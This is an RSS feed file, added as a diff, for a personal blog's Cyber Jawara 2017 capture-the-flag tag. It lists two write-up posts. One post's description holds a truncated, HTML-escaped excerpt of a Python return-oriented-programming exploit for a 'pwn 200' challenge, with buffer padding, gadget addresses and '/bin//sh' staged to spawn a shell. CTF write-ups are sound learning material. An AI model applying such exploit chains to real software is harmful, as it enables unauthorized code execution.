@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>CyberJawara2017 on /home/rhama/</title>
+    <link>/tags/cyberjawara2017/</link>
+    <description>Recent content in CyberJawara2017 on /home/rhama/</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    
+	<atom:link href="/tags/cyberjawara2017/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Cyber Jawara 2017 - Write Up</title>
+      <link>/post/2017-11-20-cyber-jawara-2017/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/post/2017-11-20-cyber-jawara-2017/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Cyber Jawara 2017 Final - echo (pwn 200)</title>
+      <link>/post/2017-11-20-cyber-jawara-2017-final-pwn200/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/post/2017-11-20-cyber-jawara-2017-final-pwn200/</guid>
+      <description>fromstruct importpack
+# Padding goes herep =&#39;A&#39;*10008p +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x0000000000401817) # pop rsi ; retp +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000006cb080) # @ .datap +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x0000000000479ce6) # pop rax ; pop rdx ; pop rbx ; retp +=&amp;rsquo;/bin//sh&#39;p +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x4141414141414141) # paddingp +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x4141414141414141) # paddingp +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000004755c1) # mov qword ptr [rsi], rax ; retp +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x0000000000401817) # pop rsi ; retp +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000006cb088) # @ .data + 8p +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x000000000042695f) # xor rax, rax ; retp +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000004755c1) # mov qword ptr [rsi], rax ; retp +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000004005d5) # pop rdi ; retp +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000006cb080) # @ .</description>
+    </item>
+    
+  </channel>
+</rss>
